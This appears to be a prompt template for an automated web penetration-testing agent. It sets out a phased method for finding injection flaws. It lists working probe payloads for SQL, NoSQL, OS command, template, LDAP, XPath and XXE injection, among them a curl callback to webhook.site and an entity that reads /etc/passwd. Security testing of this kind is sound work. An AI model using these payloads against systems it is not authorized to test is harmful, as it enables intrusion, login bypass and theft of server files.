<systematic_approach>

## Phase 1: Identify Candidate Endpoints

From discovery, select endpoints with parameters most likely vulnerable:
- Query parameters: `?id=`, `?search=`, `?filter=`, `?order=`, `?sort=`
- Request body fields containing strings/numbers
- Path variables like `/users/:id`
- Headers that may influence queries: `X-Filter`, `X-Query`

## Phase 2: SQL Injection Testing

For each candidate, test:
- Boolean-based: `1 OR 1=1`, `1 AND 1=2`
- Error-based: `'`, `"`, `\\`, `1/0`, `SLEEP(0)`
- UNION-based: `1 UNION SELECT NULL--`
- Time-based: `1; SELECT SLEEP(5)--`, `1 OR (SELECT 1 FROM (SELECT SLEEP(5))a)--`

```bash
# Time-based example
time curl -s "{{WEB_URL}}/api/users?id=1' OR SLEEP(5)--"
```

If response time jumps by ~5s → time-based SQLi confirmed. Record baseline and injection times.

## Phase 3: NoSQL Injection (MongoDB-style)

For JSON bodies and query strings:
- Object injection: `{"$gt": ""}`, `{"$ne": null}`, `{"$regex": ".*"}`
- Operator bypass: `{"password": {"$ne": null}}`
- Server-side JavaScript: `";return true;var x="`

## Phase 4: Command Injection

Look for endpoints that call OS commands: ping, dns lookup, file processing.
Payloads:
- Separators: `; id`, `| id`, `&& id`, `$(id)`, `` `id` ``
- Out-of-band: `; curl http://webhook.site/<id>`
- Blind time-based: `; sleep 5`

## Phase 5: Server-Side Template Injection (SSTI)

Test parameters that may be reflected in templates (emails, error messages):
- `{{7*7}}` → 49 means Jinja2/Twig
- `${7*7}` → 49 means FreeMarker
- `#{7*7}` → 49 means Ruby
- `<%= 7*7 %>` → 49 means ERB

## Phase 6: LDAP / XPath / XML Injection

- LDAP: `*)(uid=*))(|(uid=*`, `admin)(&))`
- XPath: `' or '1'='1`
- XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`

## Phase 7: Second-Order Injection

- Store a payload via one endpoint (e.g., profile update)
- Trigger retrieval via another (e.g., search, admin panel)
- Check if stored value is later interpreted as code/query

</systematic_approach>
